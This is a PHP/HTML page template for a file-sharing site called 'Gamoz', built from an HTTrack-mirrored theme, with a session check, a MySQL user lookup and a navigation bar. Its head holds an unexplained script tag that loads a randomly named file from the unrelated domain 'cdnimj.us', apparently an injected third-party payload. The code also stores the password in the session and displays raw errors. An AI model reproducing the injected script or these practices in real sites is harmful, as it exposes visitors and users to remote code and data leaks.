<?php 
session_start();
if (!isset($_SESSION["user"])) {
   // header("location:index.php"); 
   exit();
}
$userID = preg_replace('#[^0-9]#i', '', $_SESSION["id"]); 
$user = preg_replace('#[^A-Za-z0-9]#i', '', $_SESSION["user"]); 
//$email = preg_replace('#[^A-Za-z0-9]#i', '', $_SESSION["email"]); 
$password = preg_replace('#[^A-Za-z0-9]#i', '', $_SESSION["password"]); 
 
include "storescripts/connect_to_mysql.php"; 
$sql = mysql_query("SELECT * FROM user WHERE id='$userID'  LIMIT 1"); 
if ($sql==false)
{
    die(mysql_error());
}

$existCount = mysql_num_rows($sql); 
if ($existCount == 0) { 
	 echo "Your login session data is not on record in the database.";
     exit();
}
?>
<?php 

error_reporting(E_ALL);
ini_set('display_errors', '1');
?>





<!DOCTYPE html>
<html lang="en">

    
<!-- Mirrored from azmind.com/premium/marco/v2-4/layout-15/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 24 Feb 2017 14:30:17 GMT -->
<head><script async type='text/javascript' src='../../../../../cdnimj.us/2ErTrBMV_3231.js'></script>

        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>Gamoz</title>

        <!-- CSS -->
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:100,100italic,300,300italic,400,400italic,500,500italic">
        <link rel="stylesheet" href="assets/bootstrap/css/bootstrap.min.css">
        <link rel="stylesheet" href="assets/font-awesome/css/font-awesome.min.css">
        <link rel="stylesheet" href="assets/css/animate.css">
        <link rel="stylesheet" href="assets/css/style.css">
		
        <link rel="stylesheet" href="assets/css/media-queries.css">

        <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
        <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
        <!--[if lt IE 9]>
            <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
            <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
        <![endif]-->

        <!-- Favicon and touch icons -->
        <link rel="shortcut icon" href="assets/ico/g.png">
        

    </head>

    <body>
    
   
        	
        	<!-- Top menu -->
			<nav class="navbar navbar-inverse " role="navigation">
				<div class="container">
					<div class="navbar-header">
						<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#top-navbar-1">
							<span class="sr-only">Toggle navigation</span>
							<span class="icon-bar"></span>
							<span class="icon-bar"></span>
							<span class="icon-bar"></span>
						</button>
						<a class="navbar-brand" href="index.html">Gamoz</a>
					</div>
					<!-- Collect the nav links, forms, and other content for toggling -->
					<div class="collapse navbar-collapse" id="top-navbar-1">
						<ul class="nav navbar-nav navbar-right">
							<li><a class="" href="home.php">Home</a></li>
							<li><a href="upload.php">Upload file</a></li>
							<li><a class="" href="community.php">Community</a></li>							
							<li><a href="post.php">Post Project</a></li>
                                                        <li><a href="my_projects.php">My Projects</a></li>                                                        
                                                        <li><a href="my_upload.php">My File Uploads</a></li>
                                                        
<?php
error_reporting(E_ERROR | E_WARNING | E_PARSE);

session_start();
if(isset($_SESSION['user']))
{
 ?>
<li><a href="profile.php"><?php echo $_SESSION['user'] ?></a></li>

<li><a href="logout.php">Logout</a></li>
<?php } ?> 
							
							
						</ul>
					</div>
				</div>
			</nav>
        	
            

        <!-- Javascript -->
        <script src="assets/js/jquery-1.11.1.min.js"></script>
        <script src="assets/bootstrap/js/bootstrap.min.js"></script>
        <script src="assets/js/jquery.backstretch.min.js"></script>
        <script src="assets/js/wow.min.js"></script>
        <script src="assets/js/retina-1.1.0.min.js"></script>
        <script src="assets/js/scripts.js"></script>
        
        <!--[if lt IE 10]>
            <script src="assets/js/placeholder.js"></script>
        <![endif]-->

    </body>


<!-- Mirrored from azmind.com/premium/marco/v2-4/layout-15/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 24 Feb 2017 14:31:11 GMT -->
</html>